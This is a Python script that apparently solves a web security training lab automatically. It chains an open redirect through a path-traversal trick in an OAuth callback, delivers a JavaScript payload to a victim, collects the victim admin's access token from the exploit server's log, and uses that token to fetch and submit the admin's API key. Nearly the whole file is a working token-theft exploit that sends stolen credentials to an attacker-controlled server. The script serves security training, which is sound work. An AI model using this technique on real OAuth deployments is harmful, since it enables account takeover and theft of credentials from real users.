from web_security_academy.core.logger import logger
from web_security_academy.core.utils import read_file

from urllib.parse import urljoin
from jinja2 import Environment
from bs4 import BeautifulSoup
from requests import Request

import re


def solve_lab(session):
    # Explanation: When the victim first visits the exploit URL, they will start
    # an OAuth flow that ends with a redirection to a lab server URL that is
    # vulnerable to an open redirect. The lab server URL will redirect the victim
    # back to the exploit URL, this time with the access token as a part of the
    # URL's fragment. JavaScript on the exploit server will notice this and make
    # an HTTP request to the exploit server with their access token in the URL.
    # The access token can then be extracted from the exploit server logs.

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    # Construct open redirect to exploit URL (second pass)
    exploit_url = urljoin(exploit_server.url, "/exploit")
    open_redirect_path = f"/oauth-callback/../post/next?path={exploit_url}"

    # Construct OAuth URL that redirects to open redirect URL
    resp = session.get_path("/social-login")
    soup = BeautifulSoup(resp.text, "lxml")
    meta = soup.select_one('meta[http-equiv="refresh"]')
    oauth_url = meta.get("content")[6:]
    oauth_url = oauth_url.replace("/oauth-callback", open_redirect_path)

    # Send HTML / JavaScript payload to victim
    template = Environment().from_string(read_file("exploit.js").decode())
    javascript = template.render(req=Request("GET", oauth_url))
    payload = BeautifulSoup(f"<script>{javascript}</script>", "lxml").prettify()
    exploit_server.deliver_exploit_to_victim("/exploit", headers, payload)

    # Extract the admin's access token from exploit server logs
    log = exploit_server.access_log()
    access_token = re.findall(r"/\?token=([^ ]+)", log)[-1]
    logger.info(f"Extracted access token: {access_token}")

    # Use access token to get the admin's API key
    headers = {"Authorization": f"Bearer {access_token}"}
    resp = session.get(urljoin(oauth_url, "/me"), headers=headers)
    api_key = resp.json()["apikey"]
    logger.info(f"Admin API key: {api_key}")
    session.submit_solution(api_key)
